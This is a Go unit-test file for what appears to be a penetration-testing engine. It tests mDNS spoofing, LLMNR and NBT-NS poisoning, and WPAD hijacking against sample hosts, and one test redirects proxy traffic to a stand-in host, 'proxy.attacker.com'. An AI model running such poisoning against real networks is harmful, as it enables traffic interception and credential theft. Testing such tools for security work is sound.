package mdns

import (
	"testing"
)

func newTestEngine() *Engine {
	return NewEngine(MDNSConfig{
		Interface:  "eth0",
		ListenAddr: "224.0.0.251:5353",
		Domain:     "local",
		SpoofName:  "test",
		SpoofIP:    "192.168.1.100",
	})
}

func TestMdnsSpoof(t *testing.T) {
	eng := newTestEngine()
	result, err := eng.MdnsSpoof("printer", "192.168.1.100")
	if err != nil {
		t.Fatalf("MdnsSpoof failed: %v", err)
	}
	if !result.Success {
		t.Error("MdnsSpoof reported failure")
	}
	if result.Method != "mDNS_Spoof" {
		t.Errorf("expected method mDNS_Spoof, got %s", result.Method)
	}
	if result.Entries != 1 {
		t.Errorf("expected 1 entry, got %d", result.Entries)
	}
}

func TestMdnsSpoofInvalidIP(t *testing.T) {
	eng := newTestEngine()
	_, err := eng.MdnsSpoof("printer", "bad-ip")
	if err == nil {
		t.Error("expected error for invalid IP")
	}
}

func TestLLMNRPoison(t *testing.T) {
	eng := newTestEngine()
	result, err := eng.LLMNRPoison("FILESERVER", "10.0.0.50")
	if err != nil {
		t.Fatalf("LLMNRPoison failed: %v", err)
	}
	if !result.Success {
		t.Error("LLMNRPoison reported failure")
	}
	if result.Method != "LLMNR_Poison" {
		t.Errorf("expected method LLMNR_Poison, got %s", result.Method)
	}
}

func TestLLMNRPoisonInvalidIP(t *testing.T) {
	eng := newTestEngine()
	_, err := eng.LLMNRPoison("FILESERVER", "not-an-ip")
	if err == nil {
		t.Error("expected error for invalid IP")
	}
}

func TestNBTNSPoison(t *testing.T) {
	eng := newTestEngine()
	result, err := eng.NBTNSPoison("WORKSTATION1", "10.0.0.51")
	if err != nil {
		t.Fatalf("NBTNSPoison failed: %v", err)
	}
	if !result.Success {
		t.Error("NBTNSPoison reported failure")
	}
	if result.Method != "NBTNS_Poison" {
		t.Errorf("expected method NBTNS_Poison, got %s", result.Method)
	}
}

func TestNBTNSPoisonInvalidIP(t *testing.T) {
	eng := newTestEngine()
	_, err := eng.NBTNSPoison("WORKSTATION1", "garbage")
	if err == nil {
		t.Error("expected error for invalid IP")
	}
}

func TestWPADExploit(t *testing.T) {
	eng := newTestEngine()
	result, err := eng.WPADExploit("wpad.internal", "proxy.attacker.com:8080")
	if err != nil {
		t.Fatalf("WPADExploit failed: %v", err)
	}
	if !result.Success {
		t.Error("WPADExploit reported failure")
	}
	if result.Method != "WPAD_Exploit" {
		t.Errorf("expected method WPAD_Exploit, got %s", result.Method)
	}
}

func TestBuildMDNSResponse(t *testing.T) {
	eng := newTestEngine()
	rec := MDNSRecord{
		Name:  "test.local",
		Type:  1,
		Class: 1,
		TTL:   120,
		Data:  []byte{192, 168, 1, 100},
	}
	pkt := eng.buildMDNSResponse(rec)
	if len(pkt) < 12 {
		t.Errorf("MDNS response too short: %d bytes", len(pkt))
	}
}

func TestEncodeNetBIOSName(t *testing.T) {
	eng := newTestEngine()
	encoded := eng.encodeNetBIOSName("TEST")
	if len(encoded) == 0 {
		t.Error("encoded name is empty")
	}
}

func TestGeneratePACFile(t *testing.T) {
	eng := newTestEngine()
	pac := eng.generatePACFile("proxy.local:3128")
	if len(pac) == 0 {
		t.Error("PAC file is empty")
	}
	if !contains(pac, "proxy.local:3128") {
		t.Error("PAC file missing proxy address")
	}
}

func TestGetRecords(t *testing.T) {
	eng := newTestEngine()
	records := eng.GetRecords()
	if len(records) != 0 {
		t.Errorf("expected 0 records, got %d", len(records))
	}
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || len(s) > 0 && containsHelper(s, sub))
}

func containsHelper(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
